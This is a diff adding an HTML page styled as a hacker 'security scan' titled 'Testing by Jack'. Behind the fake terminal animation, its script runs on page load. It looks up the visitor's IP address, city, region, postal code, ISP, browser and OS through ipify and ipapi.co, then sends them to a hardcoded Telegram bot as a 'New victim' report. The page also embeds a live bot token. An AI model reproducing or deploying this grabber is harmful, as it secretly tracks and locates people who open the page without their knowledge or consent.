@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Testing by Jack</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background-color: #000;
+            color: #0f0;
+            overflow: hidden;
+            height: 100vh;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 80, 0, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 100, 0, 0.1) 0%, transparent 20%),
+                linear-gradient(to bottom, rgba(0, 20, 0, 0.3), rgba(0, 30, 0, 0.1));
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 900px;
+            position: relative;
+            z-index: 10;
+            background: rgba(0, 15, 0, 0.8);
+            border: 1px solid #0a0;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .header {
+            padding: 20px;
+            border-bottom: 1px solid #0a0;
+            background: rgba(0, 20, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .glitch-container {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        
+        .glitch {
+            font-size: 3.5rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
+            animation: glitch 1.5s infinite;
+            color: #0f0;
+            text-align: center;
+        }
+        
+        .glitch:before,
+        .glitch:after {
+            content: "Testing by Jack";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .glitch:before {
+            left: 2px;
+            text-shadow: -2px 0 #f00;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim 5s infinite linear alternate-reverse;
+        }
+        
+        .glitch:after {
+            left: -2px;
+            text-shadow: -2px 0 #00f;
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim2 5s infinite linear alternate-reverse;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            text-align: center;
+            color: #0a0;
+            animation: flicker 1.5s infinite alternate;
+            letter-spacing: 3px;
+        }
+        
+        .main-content {
+            display: flex;
+            padding: 20px;
+            gap: 20px;
+        }
+        
+        .terminal {
+            flex: 1;
+            background-color: rgba(0, 10, 0, 0.7);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 20px;
+            min-height: 400px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: inset 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+        
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #0a0;
+        }
+        
+        .terminal-dots {
+            display: flex;
+            margin-right: 10px;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .dot-red { background-color: #ff5f56; }
+        .dot-yellow { background-color: #ffbd2e; }
+        .dot-green { background-color: #27c93f; }
+        
+        .terminal-title {
+            color: #0f0;
+            font-size: 0.9rem;
+        }
+        
+        .terminal-content {
+            font-size: 1rem;
+            line-height: 1.6;
+            height: 300px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        
+        .terminal-line {
+            margin-bottom: 10px;
+            animation: typing 3s steps(40, end);
+            overflow: hidden;
+            white-space: nowrap;
+            border-right: 2px solid #0f0;
+            width: 0;
+        }
+        
+        .terminal-line.complete {
+            white-space: normal;
+            border-right: none;
+            width: 100%;
+        }
+        
+        .status-bar {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid #0a0;
+            border-radius: 3px;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .status {
+            color: #0f0;
+            font-size: 1rem;
+            animation: pulse 2s infinite;
+        }
+        
+        .music-control {
+            color: #0a0;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .info-panel {
+            width: 300px;
+            background: rgba(0, 15, 0, 0.7);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: inset 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+        
+        .info-title {
+            font-size: 1.2rem;
+            color: #0f0;
+            margin-bottom: 15px;
+            text-align: center;
+            border-bottom: 1px solid #0a0;
+            padding-bottom: 10px;
+        }
+        
+        .info-item {
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed #0a0;
+        }
+        
+        .info-label {
+            color: #0a0;
+            font-size: 0.9rem;
+        }
+        
+        .info-value {
+            color: #0f0;
+            font-size: 1rem;
+            word-break: break-all;
+        }
+        
+        .footer {
+            padding: 15px;
+            text-align: center;
+            color: #0a0;
+            font-size: 0.9rem;
+            border-top: 1px solid #0a0;
+            background: rgba(0, 20, 0, 0.5);
+        }
+        
+        .matrix-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.1;
+        }
+        
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 10px;
+            background: rgba(0, 255, 0, 0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.7);
+            z-index: 5;
+            animation: scan 4s linear infinite;
+        }
+        
+        /* Animations */
+        @keyframes glitch {
+            0% { text-shadow: 0 0 10px rgba(0, 255, 0, 0.7); }
+            20% { text-shadow: -2px -2px 5px #f00, 2px 2px 5px #00f; }
+            40% { text-shadow: 2px -2px 5px #f00, -2px 2px 5px #00f; }
+            60% { text-shadow: -2px 2px 5px #f00, 2px -2px 5px #00f; }
+            80% { text-shadow: 2px 2px 5px #f00, -2px -2px 5px #00f; }
+            100% { text-shadow: 0 0 10px rgba(0, 255, 0, 0.7); }
+        }
+        
+        @keyframes glitch-anim {
+            0% { clip: rect(42px, 9999px, 44px, 0); }
+            5% { clip: rect(12px, 9999px, 59px, 0); }
+            10% { clip: rect(48px, 9999px, 29px, 0); }
+            15% { clip: rect(42px, 9999px, 73px, 0); }
+            20% { clip: rect(63px, 9999px, 27px, 0); }
+            25% { clip: rect(34px, 9999px, 55px, 0); }
+            30% { clip: rect(86px, 9999px, 73px, 0); }
+            35% { clip: rect(20px, 9999px, 20px, 0); }
+            40% { clip: rect(26px, 9999px, 60px, 0); }
+            45% { clip: rect(25px, 9999px, 66px, 0); }
+            50% { clip: rect(57px, 9999px, 98px, 0); }
+            55% { clip: rect(5px, 9999px, 46px, 0); }
+            60% { clip: rect(82px, 9999px, 31px, 0); }
+            65% { clip: rect(54px, 9999px, 27px, 0); }
+            70% { clip: rect(28px, 9999px, 99px, 0); }
+            75% { clip: rect(45px, 9999px, 69px, 0); }
+            80% { clip: rect(23px, 9999px, 85px, 0); }
+            85% { clip: rect(54px, 9999px, 84px, 0); }
+            90% { clip: rect(45px, 9999px, 47px, 0); }
+            95% { clip: rect(37px, 9999px, 20px, 0); }
+            100% { clip: rect(73px, 9999px, 99px, 0); }
+        }
+        
+        @keyframes glitch-anim2 {
+            0% { clip: rect(65px, 9999px, 100px, 0); }
+            5% { clip: rect(52px, 9999px, 74px, 0); }
+            10% { clip: rect(79px, 9999px, 85px, 0); }
+            15% { clip: rect(75px, 9999px, 5px, 0); }
+            20% { clip: rect(67px, 9999px, 61px, 0); }
+            25% { clip: rect(14px, 9999px, 79px, 0); }
+            30% { clip: rect(1px, 9999px, 66px, 0); }
+            35% { clip: rect(86px, 9999px, 30px, 0); }
+            40% { clip: rect(23px, 9999px, 98px, 0); }
+            45% { clip: rect(85px, 9999px, 72px, 0); }
+            50% { clip: rect(71px, 9999px, 75px, 0); }
+            55% { clip: rect(2px, 9999px, 48px, 0); }
+            60% { clip: rect(30px, 9999px, 16px, 0); }
+            65% { clip: rect(59px, 9999px, 50px, 0); }
+            70% { clip: rect(41px, 9999px, 62px, 0); }
+            75% { clip: rect(2px, 9999px, 82px, 0); }
+            80% { clip: rect(47px, 9999px, 73px, 0); }
+            85% { clip: rect(3px, 9999px, 27px, 0); }
+            90% { clip: rect(26px, 9999px, 55px, 0); }
+            95% { clip: rect(42px, 9999px, 97px, 0); }
+            100% { clip: rect(38px, 9999px, 49px, 0); }
+        }
+        
+        @keyframes flicker {
+            0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
+                opacity: 1;
+            }
+            20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
+                opacity: 0.4;
+            }
+        }
+        
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.4; }
+            50% { opacity: 1; }
+            100% { opacity: 0.4; }
+        }
+        
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 20, 0, 0.3);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #0a0;
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #0f0;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix" class="matrix-bg"></canvas>
+    <div class="scan-line"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="glitch-container">
+                <div class="glitch">Testing by Jack</div>
+            </div>
+            <p class="subtitle">SECURITY SYSTEM ANALYSIS IN PROGRESS</p>
+        </div>
+        
+        <div class="main-content">
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="terminal-dots">
+                        <div class="dot dot-red"></div>
+                        <div class="dot dot-yellow"></div>
+                        <div class="dot dot-green"></div>
+                    </div>
+                    <div class="terminal-title">root@system:~# security_scan --full</div>
+                </div>
+                <div class="terminal-content" id="terminal-content">
+                    <div class="terminal-line">Initializing system scan protocol...</div>
+                    <div class="terminal-line">Establishing secure connection...</div>
+                    <div class="terminal-line">Loading security modules...</div>
+                    <div class="terminal-line">Accessing network interfaces...</div>
+                </div>
+                
+                <div class="status-bar">
+                    <div class="status" id="status">CONNECTING TO NETWORK...</div>
+                    <div class="music-control">
+                        <i class="fas fa-music"></i>
+                        <span>Background Music: Active</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="info-panel">
+                <div class="info-title">SYSTEM INFORMATION</div>
+                <div class="info-item">
+                    <div class="info-label">IP Address:</div>
+                    <div class="info-value" id="ip-value">Scanning...</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Location:</div>
+                    <div class="info-value" id="location-value">Scanning...</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Operating System:</div>
+                    <div class="info-value" id="os-value">Scanning...</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Browser:</div>
+                    <div class="info-value" id="browser-value">Scanning...</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">ISP:</div>
+                    <div class="info-value" id="isp-value">Scanning...</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Time:</div>
+                    <div class="info-value" id="time-value">Scanning...</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Status:</div>
+                    <div class="info-value" id="status-value">In Progress</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>SECURITY SYSTEM v4.2.7 | &copy; 2025 SYSTEM DEFENSE NETWORK</p>
+        </div>
+    </div>
+    
+    <audio id="bgMusic" loop>
+        <!-- Music sources would be added here -->
+    </audio>
+    
+    <script>
+        // Matrix background effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+        
+        const chars = "01010101ABCDEFGHIJKLMNOPQRSTUVWXYZ$#@%&*!?";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        
+        const drops = [];
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0f0';
+            ctx.font = `${fontSize}px monospace`;
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 50);
+        
+        // Terminal simulation
+        const terminalContent = document.getElementById('terminal-content');
+        const statusElement = document.getElementById('status');
+        
+        const terminalLines = [
+            "Checking system integrity...",
+            "Analyzing network configuration...",
+            "Scanning ports...",
+            "Verifying security protocols...",
+            "Collecting user data...",
+            "Establishing encrypted connection...",
+            "Accessing location services...",
+            "Compiling system profile..."
+        ];
+        
+        function addTerminalLine(text, delay) {
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    const line = document.createElement('div');
+                    line.className = 'terminal-line';
+                    line.textContent = text;
+                    terminalContent.appendChild(line);
+                    
+                    setTimeout(() => {
+                        line.classList.add('complete');
+                        terminalContent.scrollTop = terminalContent.scrollHeight;
+                        resolve();
+                    }, 2000);
+                }, delay);
+            });
+        }
+        
+        // Simulate terminal output
+        async function simulateTerminal() {
+            for (let i = 0; i < terminalLines.length; i++) {
+                await addTerminalLine(terminalLines[i], i * 1500);
+            }
+            
+            statusElement.textContent = "DATA COLLECTION COMPLETE";
+            await addTerminalLine("> All security data collected successfully", 1500);
+            await addTerminalLine("> Transmitting to secure channel...", 1500);
+            
+            // Simulate transmission completion
+            setTimeout(() => {
+                statusElement.textContent = "DATA TRANSMISSION SUCCESSFUL";
+                document.getElementById('status-value').textContent = "Transmission Complete";
+                addTerminalLine("> Transmission complete. Connection secured.", 500);
+            }, 3000);
+        }
+        
+        // Get visitor information and send to Telegram
+        async function getVisitorInfo() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Update UI
+                document.getElementById('ip-value').textContent = ip;
+                
+                // Get location data
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                // Update UI
+                document.getElementById('location-value').textContent = 
+                    `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                document.getElementById('isp-value').textContent = locationData.org;
+                
+                // Get browser info
+                const browserInfo = navigator.userAgent;
+                document.getElementById('browser-value').textContent = browserInfo;
+                
+                // Get OS info
+                const os = navigator.platform;
+                document.getElementById('os-value').textContent = os;
+                
+                // Get time
+                const now = new Date();
+                const dateTime = now.toLocaleString();
+                document.getElementById('time-value').textContent = dateTime;
+                
+                // Prepare message for Telegram
+                const message = `New victim:
+
+IP: ${ip}
+Operating System: ${os}
+Browser: ${browserInfo}
+Country: ${locationData.country_name} (${locationData.country_code})
+Region: ${locationData.region} (${locationData.region_code})
+City: ${locationData.city}
+Postal Code: ${locationData.postal}
+Time: ${dateTime}
+ISP: ${locationData.org}
+
+src: github.com/9xw`;
+                
+                // Send to Telegram bot
+                sendToTelegram(message);
+                
+            } catch (error) {
+                console.error('Error getting visitor info:', error);
+                addTerminalLine("> Error: Security protocols active. Data collection failed.", 500);
+                statusElement.textContent = "SECURITY PROTOCOL ACTIVATED";
+                document.getElementById('status-value').textContent = "Failed";
+            }
+        }
+        
+        // Send data to Telegram
+        function sendToTelegram(message) {
+            const botToken = '7967185938:AAEGUZLTCR3QBR0o9p4xj86pWEjNWHYqsTc';
+            const chatId = '7980616978';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram API response:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                });
+        }
+        
+        // Background music
+        const bgMusic = document.getElementById('bgMusic');
+        const musicTracks = [
+            "'https://f.top4top.io/m_3335yz9lm1.mp3",
+    "https://i.top4top.io/m_3328477of9.mp3",
+    "https://e.top4top.io/m_3336uygem1.mp3",
+    "https://b.top4top.io/m_33367ome01.mp3",
+    "https://b.top4top.io/m_3336dxw3y1.mp3"
+        ];
+        
+        // Start with a random track
+        let currentTrackIndex = Math.floor(Math.random() * musicTracks.length);
+        bgMusic.src = musicTracks[currentTrackIndex];
+        
+        // Autoplay music with user interaction
+        document.body.addEventListener('click', () => {
+            if (bgMusic.paused) {
+                bgMusic.play().catch(e => console.log('Autoplay prevented:', e));
+            }
+        }, { once: true });
+        
+        // Change music every 60 seconds
+        setInterval(() => {
+            currentTrackIndex = (currentTrackIndex + 1) % musicTracks.length;
+            bgMusic.src = musicTracks[currentTrackIndex];
+            bgMusic.play().catch(e => console.log('Music play prevented:', e));
+        }, 60000);
+        
+        // Start the simulation
+        setTimeout(() => {
+            simulateTerminal();
+            getVisitorInfo();
+        }, 2000);
+    </script>
+</body>
+</html>
